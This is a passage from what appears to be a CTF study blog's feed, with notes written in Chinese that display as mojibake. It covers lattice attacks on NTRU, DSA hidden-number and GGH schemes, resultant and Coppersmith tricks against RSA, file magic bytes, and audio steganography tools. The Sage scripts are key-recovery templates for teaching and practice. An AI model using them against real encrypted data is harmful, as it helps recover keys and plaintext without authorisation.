class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è„šæœ¬1-å°è§„æ¨¡</span><br><span class="hljs-comment">#Sage</span><br><span class="hljs-keyword">from</span> sage.modules.free_module_integer <span class="hljs-keyword">import</span> IntegerLattice<br><br>row = <br>column = <br>prime = <br><br>ma = <br>res = <br><br>W = matrix(ZZ, ma)<br>cc = vector(ZZ, res)<br><br><span class="hljs-comment"># Babai&#x27;s Nearest Plane algorithm</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Babai_closest_vector</span>(<span class="hljs-params">M, G, target</span>):<br>    small = target<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        fori <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(M.nrows())):<br>            c = ((small * G[i]) / (G[i] * G[i])).<span class="hljs-built_in">round</span>()<br>            small -=  M[i] * c<br>    <span class="hljs-keyword">return</span> target - small<br><br>A1 = matrix.identity(column)<br>Ap = matrix.identity(row) * prime<br>B = block_matrix([[Ap], [W]])  <br>lattice = IntegerLattice(B, lll_reduce=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LLL done&quot;</span>)<br>gram = lattice.reduced_basis.gram_schmidt()[<span class="hljs-number">0</span>]<br>target = vector(ZZ, res)<br>re = Babai_closest_vector(lattice.reduced_basis, gram, target)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Closest Vector: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(re))<br><br>R = IntegerModRing(prime)<br>M = Matrix(R, ma)<br>M = M.transpose()<br><br>ingredients = M.solve_right(re)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ingredients: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ingredients))<br><br>m = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ingredients)):<br>    m += <span class="hljs-built_in">chr</span>(ingredients[i])<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure></li></ul><h4 id="5-NTRU"><a href="#5-NTRU" class="headerlink" title="5.NTRU"></a>5.NTRU</h4><ul><li><strong>æ¦‚è¿°ï¼š</strong> å…¬å¼€å¯†é’¥åŠ å¯†ç³»ç»Ÿï¼Œä½¿ç”¨åŸºäºæ ¼çš„åŠ å¯†ç®—æ³•æ¥åŠ å¯†ï¼ŒåŒ…æ‹¬<strong>åŠ å¯†ç®—æ³•</strong>å’Œ<strong>ç­¾åç®—æ³•</strong>ã€‚</li><li><strong>å¯†é’¥ç”Ÿæˆï¼š</strong> $h\equiv f^{-1}g \mod p$ï¼Œå·²çŸ¥å…¬é’¥$(h,p)$ï¼Œæ±‚ç§é’¥$(f,g)$</li><li><strong>åŠ å¯†ï¼š</strong>$c\equiv rh + m \mod p$</li><li><strong>è§£å¯†ï¼š</strong>$cf\equiv rg + mf\mod p$ï¼Œæ»¡è¶³$rg + mf&lt;p$ï¼Œåˆ™æœ‰$a\equiv cf\equiv mf \mod g$ï¼Œå› æ­¤åªè¦æœ‰ç§é’¥$(f,g)$å’Œå¯†æ–‡$c$ï¼Œå°±èƒ½æ±‚å¾—æ˜æ–‡$m$</li><li><strong>æ„é€ æ ¼ï¼š</strong> $h\equiv f^{-1}g \mod p$å˜æ¢å¾—åˆ°$g&#x3D;hf+kp$</li></ul><span>$$(f,k)\begin{pmatrix}1 & h \\0 & p\end{pmatrix}=(f,g)$$</span><ul><li>è„šæœ¬æ±‚è§£</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <br>h = <br>c = <br><br>M = Matrix(ZZ,[[<span class="hljs-number">1</span>,h],[<span class="hljs-number">0</span>,p]])<br>L = M.LLL()[<span class="hljs-number">0</span>]<br>f , g = L<br>f = <span class="hljs-built_in">abs</span>(f)<br>g = <span class="hljs-built_in">abs</span>(g)<br><span class="hljs-comment">#print(f,q)</span><br>a = (c*f) %p<br>m = a*inverse(f,g)%g<br></code></pre></td></tr></table></figure><h4 id="6-Ring-LWEé—®é¢˜"><a href="#6-Ring-LWEé—®é¢˜" class="headerlink" title="6.Ring-LWEé—®é¢˜"></a>6.Ring-LWEé—®é¢˜</h4><ul><li><strong>æ¦‚è¿°ï¼š</strong> <strong>LWE</strong>åœ¨ç¯ä¸Šçš„ç‰ˆæœ¬ï¼Œ$A$å’Œ$x$æ˜¯å¤šé¡¹å¼ç¯</li></ul><h4 id="7-HNPé—®é¢˜ï¼ˆéšè—æ•°é—®é¢˜ï¼‰"><a href="#7-HNPé—®é¢˜ï¼ˆéšè—æ•°é—®é¢˜ï¼‰" class="headerlink" title="7.HNPé—®é¢˜ï¼ˆéšè—æ•°é—®é¢˜ï¼‰"></a>7.HNPé—®é¢˜ï¼ˆéšè—æ•°é—®é¢˜ï¼‰</h4><ul><li><p><strong>æ¦‚è¿°ï¼š</strong> ä»¥åŸºäºDSAä¸ºä¾‹</p></li><li><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>t = <span class="hljs-number">40</span><br><br><span class="hljs-comment"># Load data</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>(q, Hm_s, r_s, s_s) = json.load(f)<br><br><span class="hljs-comment"># Calculate A &amp; B</span><br>A = []<br>B = []<br><span class="hljs-keyword">for</span> r, s, Hm <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(r_s, s_s, Hm_s):<br>    A.append( ZZ( (inverse_mod(s, q)*r) % q ) )<br>    B.append( ZZ( (inverse_mod(s, q)*Hm) % q ) )<br><br><span class="hljs-comment"># Construct Lattice</span><br>K = <span class="hljs-number">2</span>^<span class="hljs-number">122</span>   <span class="hljs-comment"># ki &lt; 2^122</span><br>X = q * identity_matrix(QQ, t) <span class="hljs-comment"># t * t</span><br>Z = matrix(QQ, [<span class="hljs-number">0</span>] * t + [K/q] + [<span class="hljs-number">0</span>]).transpose() <span class="hljs-comment"># t+1 column</span><br>Z2 = matrix(QQ, [<span class="hljs-number">0</span>] * (t+<span class="hljs-number">1</span>) + [K]).transpose()    <span class="hljs-comment"># t+2 column</span><br><br>Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) <span class="hljs-comment"># (t+2) * t</span><br>Y = block_matrix([[Y, Z, Z2]])<br><br><span class="hljs-comment"># Find short vector</span><br>Y = Y.LLL()<br><br><span class="hljs-comment"># check</span><br>k0 = ZZ(Y[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>] % q)<br>x = ZZ(Y[<span class="hljs-number">1</span>, -<span class="hljs-number">2</span>] / (K/q) % q)<br><span class="hljs-keyword">assert</span>(k0 == (A[<span class="hljs-number">0</span>]*x + B[<span class="hljs-number">0</span>]) % q)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure></li></ul><h4 id="8-GGHåŠ å¯†"><a href="#8-GGHåŠ å¯†" class="headerlink" title="8.GGHåŠ å¯†"></a>8.GGHåŠ å¯†</h4><ul><li><p><strong>æ¦‚è¿°ï¼š</strong> $c&#x3D;m*Bâ€™+e,Bâ€™&#x3D;UB$ï¼Œå·²çŸ¥$c,B$ï¼Œæ±‚$m$</p></li><li><p><strong>ä»£ç ï¼šï¼ˆNguyenâ€™s Attackç®—æ³•ï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Sage</span><br><span class="hljs-comment"># e=mW+r</span><br><span class="hljs-keyword">from</span> sage.modules.free_module_integer <span class="hljs-keyword">import</span> IntegerLattice<br><br>W = <br>e = <br><br>B = W.stack(e).augment(vector([<span class="hljs-number">0</span>] * W.ncols() + [<span class="hljs-number">1</span>]))<br>r = IntegerLattice(B).shortest_vector()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r = &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(r))<br><br>m = W.solve_left(e - r[:-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;m = &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(m))<br></code></pre></td></tr></table></figure></li></ul><h4 id="9-HLCP-éšçº¿æ€§ç»„åˆé—®é¢˜"><a href="#9-HLCP-éšçº¿æ€§ç»„åˆé—®é¢˜" class="headerlink" title="9.HLCP(éšçº¿æ€§ç»„åˆé—®é¢˜)"></a>9.HLCP(éšçº¿æ€§ç»„åˆé—®é¢˜)</h4><ul><li><strong>æ¦‚è¿°ï¼š</strong> $w&#x3D;vG$ï¼Œå…¶ä¸­$w,v$ä¸º$GF(p)$ä¸Šçš„å‘é‡ï¼Œ$G$æ˜¯$0$è‡³$B$ä¹‹é—´æ•´æ•°å€¼çŸ©é˜µã€‚å·²çŸ¥$w$ï¼Œæ¢å¤çŸ©é˜µ$G$ã€‚</li></ul><h4 id="10-a-iX-i-equiv-b-i-mod-P-S"><a href="#10-a-iX-i-equiv-b-i-mod-P-S" class="headerlink" title="10.$a_iX_i \equiv b_i \mod (P+S)$"></a>10.$a_iX_i \equiv b_i \mod (P+S)$</h4><span>$$(k_1k_2,a_1k_2,a_2k_1,a_1a_2) \\\begin{pmatrix}1 & P & 0 & P^2 \\0 & X_1 & X_1 & X_1P \\0 & 0 & -X_2 & X_2P \\0 & 0 & 0 & X_1X_2\\ \end{pmatrix}\\=(k_1k_2,k_2(b_1-sk_1),b_1k_2-b_2k_1,(b_1-k_1s)(b_2-k_2s)$$</span><span>$$B \approx (P^{2\alpha},P^{2\alpha+\gamma},P^{\alpha+\beta},P^{2\alpha+2\gamma})\\\begin{pmatrix}P^{2\gamma} & 0 & 0 & 0\\0 & P^{\gamma} & 0 & 0 \\0 & 0 & P^{\alpha-\beta+2\gamma} & 0 \\0 & 0 & 0 & 1\\\end{pmatrix}$$</span><p><strong>å‚è€ƒï¼š</strong> </p><p><a href="https://dexterjie.github.io/2023/07/28/%E5%88%9D%E8%AF%86%E6%A0%BC/?highlight=%E6%A0%BC">åˆè¯†æ ¼ | DexterJieâ€™Blog</a></p><p><a href="https://tover.xyz/p/LLL-attack-equation/#%E7%BA%BF%E6%80%A7%E7%BB%84%E5%90%88">æ ¼æ”»å‡»ä¹‹å°æœªçŸ¥æ•°æ–¹ç¨‹æ±‚è§£å…¥é—¨â€”â€”åŸç†ä¸ä¾‹å­ | Toverâ€™s Blog</a></p><p><a href="https://blog.csdn.net/qq_42667481/article/details/118332181">æ ¼åŸºè§„çº¦ç®—æ³•æ¦‚è§ˆ-CSDNåšå®¢</a></p><p><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%A0%BC%E5%AF%86%E7%A0%81/index.html">æ ¼å¯†ç  | Lazzaro (lazzzaro.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç»“å¼ä¸RSA</title>
    <link href="/2025/04/02/%E7%BB%93%E5%BC%8F%E4%B8%8ERSA/"/>
    <url>/2025/04/02/%E7%BB%93%E5%BC%8F%E4%B8%8ERSA/</url>
    
    <content type="html"><![CDATA[<h1 id="Cryptoä¸­çš„ç»“å¼"><a href="#Cryptoä¸­çš„ç»“å¼" class="headerlink" title="Cryptoä¸­çš„ç»“å¼"></a>Cryptoä¸­çš„ç»“å¼</h1><p>å‰å‡ å¤©åšé¢˜é‡è§äº†ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p><h2 id="ç»“å¼ï¼ˆresultantï¼‰"><a href="#ç»“å¼ï¼ˆresultantï¼‰" class="headerlink" title="ç»“å¼ï¼ˆresultantï¼‰"></a>ç»“å¼ï¼ˆresultantï¼‰</h2><ul><li><p><strong>æ¦‚å¿µï¼š</strong> åœ¨åŸŸä¸­ï¼Œå¤šé¡¹å¼çš„ç»“å¼æ˜¯Sylvester Matrixçš„è¡Œåˆ—å¼ã€‚</p></li><li><p><strong>å®šä¹‰ï¼š</strong> æœ‰ä¸¤ä¸ªå¤šé¡¹å¼</p></li></ul><span>$$f(x)=\sum_{i=0}^ma_ix^i \\g(x)=\sum_{j=0}^nb_jx^j$$</span>  <p>  æ„é€ å¦‚ä¸‹çŸ©é˜µï¼š</p><span>$$S_{f,g}:=\begin{bmatrix}a_m  & a_{m-1} & \cdots & a_1 & a_0 & & \\ \\& \ddots & \ddots & & \ddots & \ddots\\& & a_m & a_{m-1} & \dots & a_1 & a_0 & \\b_n  & b_{n-1} & \cdots & b_1 & b_0 & & \\ \\& \ddots & \ddots & & \ddots & \ddots\\& & b_n & b_{n-1} & \dots & b_1 & b_0 & \\\end{bmatrix}$$</span>  <p>  å…¶ä¸­å‰$n$è¡Œæ˜¯$f(x)$,å$m$è¡Œæ˜¯$g(x)$</p><p>  è¯¥çŸ©é˜µç§°ä¸º<strong>SylvesterçŸ©é˜µ</strong>ï¼Œå®ƒçš„<strong>è¡Œåˆ—å¼</strong>ä¸º <strong>$res(f,g)$</strong>,ç§°ä¸º$f,g$çš„<strong>ç»“å¼</strong>ã€‚</p><ul><li><p><strong>åº”ç”¨ï¼š</strong></p><ul><li><p><strong>åˆ¤æ–­äº’ç´ ï¼š</strong> å½“ä¸”ä»…å½“$res(f,g)&#x3D;0$æ—¶ï¼Œä¸¤å¤šé¡¹å¼å­˜åœ¨å…¬å…±æ ¹ã€‚</p></li><li><p><strong>æ¶ˆå…ƒï¼š</strong> å‡è®¾æœ‰</p></li></ul></li></ul><span>  $$    \begin{cases}F(x,y)=0 \\G(x,y)=0\end{cases}$$</span>    <p>å°†$y$è§†ä¸ºå¸¸æ•°ï¼Œæ­¤æ—¶$f(x),g(x)$æœ‰å…¬å› å­ï¼Œå› æ­¤ä»¤$res(f,g)&#x3D;0$å¯ä»¥è§£å‡º$y$ï¼Œå†ä»£å…¥åŸæ–¹ç¨‹ä¾¿å¯ä»¥è§£å‡º$x$ã€‚ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>R = PolynomialRing(ZZ, <span class="hljs-string">&#x27;x, y&#x27;</span>)<br>f1 =<span class="hljs-comment">#x,yçš„è¡¨è¾¾å¼1</span><br>f2 =<span class="hljs-comment">#x,yçš„è¡¨è¾¾å¼2</span><br>h = f1.sylvester_matrix(f2, y).det()     Â Â Â Â <span class="hljs-comment">#åˆ©ç”¨ç»“å¼æ¶ˆæ‰y</span><br>roots = h.univariate_polynomial().roots()Â Â Â Â <span class="hljs-comment">#æ±‚å‡ºx</span><br><span class="hljs-built_in">print</span>(roots)<br></code></pre></td></tr></table></figure><p><strong>ç»“åˆcoppersmithæ–¹æ³•</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br>n = <br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(n))<br>f1 =<span class="hljs-comment">#x,yçš„è¡¨è¾¾å¼1</span><br>f2 =<span class="hljs-comment">#x,yçš„è¡¨è¾¾å¼2</span><br><br>h1 = f1.sylvester_matrix(f2, y).det()     <span class="hljs-comment">#åˆ©ç”¨ç»“å¼æ¶ˆæ‰y</span><br>h2 = f2.sylvester_matrix(f1, x).det() <br>x_roots = h1.univariate_polynomial().monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">128</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)<span class="hljs-comment">#æ±‚å‡ºx</span><br>y_roots = h2.univariate_polynomial().monic().small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">128</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)<br><span class="hljs-built_in">print</span>(x_roots)<br><span class="hljs-built_in">print</span>(y_roots)<br></code></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://tover.xyz/p/resultant-companion-hardrsa/#Resultant">ç»“å¼ã€ä¼´éšçŸ©é˜µã€ç‰¹å¾å¤šé¡¹å¼å’Œ2023æ±Ÿè‹çœæ•°æ®å®‰å…¨ç«èµ›çš„hardrsa | Toverâ€™s Blog</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>ç»“å¼ä¸rsa</tag>
      
      <tag>ç»“å¼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–‡ä»¶å¤´</title>
    <link href="/2025/04/02/%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
    <url>/2025/04/02/%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="å¸¸è§æ–‡ä»¶å¤´"><a href="#å¸¸è§æ–‡ä»¶å¤´" class="headerlink" title="å¸¸è§æ–‡ä»¶å¤´"></a>å¸¸è§æ–‡ä»¶å¤´</h1><p><strong>png(apng):</strong> <code>89 50 4E 47</code> <code>(â€°PNG)</code><br><strong>jpg:</strong> <code>FF D8 FF E0 00 10 4A 46 49 46</code> <code>(Ã¿Ã˜Ã¿Ã ..JFIF)</code><br><strong>gif:</strong><code>47 49 46</code> <code>(GIF)</code><br><strong>bmp:</strong> <code>42 4D</code> <code>(BM)</code><br><strong>bpg:</strong> <code>42 50 47</code> <code>(BPG)</code><br><strong>tiff:</strong> <code>49 49 2A 00</code><br><strong>zip:</strong> <code>50 4B 03 04</code> <code>(PK..)</code><br><strong>7z:</strong> <code>37 7A BC AF 27 1C</code> <code>(7zÂ¼Â¯&#39;.)</code><br><strong>rar:</strong> <code>52 61 72 21</code> <code>(Rar!)</code><br><strong>doc:</strong> <code>D0 CF 11 E0</code><br><strong>docx:</strong> <code>50 4B 03 04</code> <code>(æœ¬è´¨æ˜¯xmlæ–‡ä»¶å‹ç¼©åŒ…)</code><br><strong>wav:</strong> <code>52 49 46 46</code> <code>(RIFF)</code><br><strong>xml:</strong> <code>3C 3F 78 6D 6C</code> <code>(&lt;?xml)</code><br><strong>html:</strong> <code>68 74 6D 6C 3E</code> <code>(html&gt;)</code></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCéŸ³é¢‘é¢˜</title>
    <link href="/2025/04/02/MISC%E9%9F%B3%E9%A2%91%E9%A2%98/"/>
    <url>/2025/04/02/MISC%E9%9F%B3%E9%A2%91%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="éŸ³é¢‘é¢˜ä¸­çš„å¤æ€ª"><a href="#éŸ³é¢‘é¢˜ä¸­çš„å¤æ€ª" class="headerlink" title="éŸ³é¢‘é¢˜ä¸­çš„å¤æ€ª"></a>éŸ³é¢‘é¢˜ä¸­çš„å¤æ€ª</h1><h2 id="1-æ‘©æ–¯å¯†ç "><a href="#1-æ‘©æ–¯å¯†ç " class="headerlink" title="1.æ‘©æ–¯å¯†ç "></a>1.æ‘©æ–¯å¯†ç </h2><p>æ”¾è¿›Audacityä¸­çœ‹éŸ³é¢‘é•¿çŸ­ï¼Œè‹¥éŸ³é¢‘é•¿çŸ­åˆ†æ˜ï¼Œä¸”åˆ†ç»„æ˜ç¡®ï¼Œå¤§æ¦‚ç‡æ˜¯morse</p><h2 id="2-sstv"><a href="#2-sstv" class="headerlink" title="2.sstv"></a>2.sstv</h2><p><strong>å¯¹è±¡</strong>ï¼šwav<br>æ…¢æ‰«æç”µè§†ï¼Œçœ‹å¦ä¸€ç¯‡æ–‡ç« ã€‚</p><h2 id="3-PT2242"><a href="#3-PT2242" class="headerlink" title="3.PT2242"></a>3.PT2242</h2><p><strong>å¯¹è±¡</strong>ï¼šwav<br>ç”µå•è½¦é”è½¦ä¿¡å·ï¼Œçœ‹å¦ä¸€ç¯‡æ–‡ç« ã€‚</p><h2 id="4-Steghideéšå†™"><a href="#4-Steghideéšå†™" class="headerlink" title="4.Steghideéšå†™"></a>4.Steghideéšå†™</h2><p><strong>ç¯å¢ƒï¼š</strong> kali<br><strong>å¯¹è±¡ï¼š</strong> åŒ…æ‹¬jpegã€bmpã€wmvã€auæ–‡ä»¶</p><ul><li><p><strong>éšè—æ•°æ®</strong>ï¼š<code>steghide embed -cf &lt;è½½ä½“æ–‡ä»¶&gt; -ef &lt;å¾…éšè—æ–‡ä»¶&gt; -p &lt;å¯†ç &gt;</code></p></li><li><p><strong>æå–æ•°æ®</strong>ï¼š<code>steghide extract -sf &lt;å«éšè—ä¿¡æ¯çš„æ–‡ä»¶&gt; -p &lt;å¯†ç &gt;</code></p></li><li><p><strong>æŸ¥çœ‹ä¿¡æ¯</strong>ï¼š<code>steghide info &lt;æ–‡ä»¶å&gt;</code></p></li></ul><h2 id="5-Silenteyeéšå†™"><a href="#5-Silenteyeéšå†™" class="headerlink" title="5.Silenteyeéšå†™"></a>5.Silenteyeéšå†™</h2><p><strong>å¯¹è±¡</strong>ï¼šwav<br>ä½¿ç”¨Silenteyeå·¥å…·è§£å¯†</p><h2 id="6-Spectrogramï¼ˆé¢‘è°±å›¾ï¼‰"><a href="#6-Spectrogramï¼ˆé¢‘è°±å›¾ï¼‰" class="headerlink" title="6.Spectrogramï¼ˆé¢‘è°±å›¾ï¼‰"></a>6.Spectrogramï¼ˆé¢‘è°±å›¾ï¼‰</h2><p>ä½¿ç”¨<code>Sonic Visualiser</code> è½¯ä»¶åˆ†æã€‚åœ¨<code>layer -&gt; Add Peak Frequency Spectrogram</code>ä¸­è°ƒå‚æ•°ï¼Œå¾—åˆ°éšè—ä¿¡æ¯ã€‚</p><p>æˆ–è€…ç›´æ¥ä½¿ç”¨<code>audacity</code>æŸ¥çœ‹é¢‘è°±ã€‚</p><h2 id="7-MP3éšå†™"><a href="#7-MP3éšå†™" class="headerlink" title="7.MP3éšå†™"></a>7.MP3éšå†™</h2><p><strong>å¯¹è±¡</strong>ï¼šmp3<br><strong>å·¥å…·</strong>ï¼š<strong>mp3stego</strong><br><strong>æ“ä½œï¼š</strong> åœ¨<code>decode.exe</code>æ‰€åœ¨æ–‡ä»¶ä¸­æ‰“å¼€cmdï¼Œè¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">decode.exe -X xxx.mp3 -P pass<br></code></pre></td></tr></table></figure><h2 id="8-MKVæ–‡ä»¶åˆ†ç¦»"><a href="#8-MKVæ–‡ä»¶åˆ†ç¦»" class="headerlink" title="8.MKVæ–‡ä»¶åˆ†ç¦»"></a>8.MKVæ–‡ä»¶åˆ†ç¦»</h2><p><strong>ä»‹ç»ï¼š</strong> å¤šåª’ä½“æ–‡ä»¶æ ¼å¼ï¼Œé€šå¸¸ç”¨äºå­˜å‚¨è§†é¢‘ã€éŸ³é¢‘å’Œå­—å¹•ç­‰å¤šåª’ä½“å†…å®¹ã€‚<br><strong>å·¥å…·ï¼š</strong> MKVToolNiï¼ˆé“¾æ¥ï¼š<a href="https://www.52pojie.cn/thread-1876805-1-1.html">MKV å¤„ç†å·¥å…·(MKVToolNix) v82.0.0 - å¾çˆ±ç ´è§£ - 52pojie.cn</a>ï¼‰</p><h2 id="9-Steganographierè„šæœ¬å·¥å…·"><a href="#9-Steganographierè„šæœ¬å·¥å…·" class="headerlink" title="9.Steganographierè„šæœ¬å·¥å…·"></a>9.Steganographierè„šæœ¬å·¥å…·</h2><p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href="https://github.com/cenglin123/SteganographierGUI">cenglin123&#x2F;SteganographierGUI</a><br><strong>åŠŸèƒ½</strong>ï¼šå°†æ–‡ä»¶éšå†™è¿›MP4&#x2F;MKVæ–‡ä»¶ä¸­<br>éšå†™æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Steganographier.py -i <span class="hljs-string">&quot;input.txt&quot;</span> -o <span class="hljs-string">&quot;output.mp4&quot;</span> -p <span class="hljs-string">&quot;password&quot;</span> -t <span class="hljs-string">&quot;mp4&quot;</span> -c <span class="hljs-string">&quot;cover.mp4&quot;</span><br>python Steganographier.py -i <span class="hljs-string">&quot;input.txt&quot;</span> -o <span class="hljs-string">&quot;outputFolder&quot;</span> -p <span class="hljs-string">&quot;password&quot;</span> -t <span class="hljs-string">&quot;mp4&quot;</span> -c <span class="hljs-string">&quot;cover.mp4&quot;</span><br></code></pre></td></tr></table></figure><p>éšå†™æ–‡ä»¶å¤¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Steganographier.py -i <span class="hljs-string">&quot;inputFolder&quot;</span> -o <span class="hljs-string">&quot;outputFolder&quot;</span> -p <span class="hljs-string">&quot;password&quot;</span> -t <span class="hljs-string">&quot;mp4&quot;</span><br>python Steganographier.py -i <span class="hljs-string">&quot;inputFolder&quot;</span> -o <span class="hljs-string">&quot;output.mp4&quot;</span> -p <span class="hljs-string">&quot;password&quot;</span> -t <span class="hljs-string">&quot;mp4&quot;</span><br></code></pre></td></tr></table></figure><p>è§£é™¤éšå†™æå–æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Steganographier.py -i <span class="hljs-string">&quot;input.mp4&quot;</span> -r -p <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure><p>è‹¥ä»…æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼Œåˆ™ä½¿ç”¨é»˜è®¤è®¾ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python Steganographier.py <span class="hljs-string">&quot;input.txt&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISCå–è¯</title>
    <link href="/2025/04/02/MISC%E5%8F%96%E8%AF%81/"/>
    <url>/2025/04/02/MISC%E5%8F%96%E8%AF%81/</url>
    
